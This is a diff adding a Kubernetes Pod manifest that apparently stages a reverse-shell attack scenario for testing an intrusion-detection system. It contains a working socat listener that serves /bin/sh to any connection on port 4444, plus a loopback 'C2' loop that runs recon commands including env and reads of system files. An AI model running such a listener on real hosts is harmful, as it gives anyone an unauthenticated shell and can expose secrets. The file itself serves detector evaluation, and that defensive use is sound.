@@ -1,0 +1,64 @@
+# H3 attack: reverse shell with real socat. The C2 side is on loopback, so
+# there is no egress; the kernel still sees the real connect + execve + openat
+# sequence of a shell running recon commands.
+apiVersion: v1
+kind: Pod
+metadata:
+  # Not part of a protected deployment; run_h3.py admits it by name.
+  name: rshell-attacker
+  namespace: default
+  labels:
+    role: attacker
+    scenario: h3
+    attack-class: reverse-shell
+  annotations:
+    ids-research.io/mitre-attack: "T1059 (Command and Scripting Interpreter), T1571 (Non-Standard Port)"
+spec:
+  containers:
+    - name: rshell
+      image: alpine:3.20
+      imagePullPolicy: IfNotPresent
+      command:
+        - /bin/sh
+        - -c
+        - |
+          set -eu
+          apk add --no-cache socat > /dev/null
+          echo "[rshell] socat installed: $(socat -V 2>&1 | head -1)"
+
+          # Listener that spawns /bin/sh for every connection.
+          echo "[rshell] starting socat TCP-LISTEN:4444,fork,reuseaddr EXEC:/bin/sh"
+          socat TCP-LISTEN:4444,fork,reuseaddr EXEC:/bin/sh &
+          SOCAT_PID=$!
+
+          sleep 1
+
+          # "C2": connect to the listener every 1.5 s and run recon commands.
+          echo "[rshell] starting C2 simulator loop (target=127.0.0.1:4444)"
+
+          trap 'kill $SOCAT_PID 2>/dev/null; exit 0' TERM INT
+
+          COMMANDS='id
+          uname -a
+          ls /tmp
+          cat /etc/hostname
+          cat /etc/os-release
+          ps aux
+          netstat -an 2>/dev/null
+          env
+          whoami
+          pwd'
+
+          while true; do
+            echo "$COMMANDS" | socat - TCP:127.0.0.1:4444 > /dev/null 2>&1 \
+              || echo "[rshell] connect failed, retrying"
+            sleep 1.5
+          done
+      resources:
+        requests:
+          cpu: "50m"
+          memory: "32Mi"
+        limits:
+          cpu: "200m"
+          memory: "128Mi"
+  restartPolicy: Never
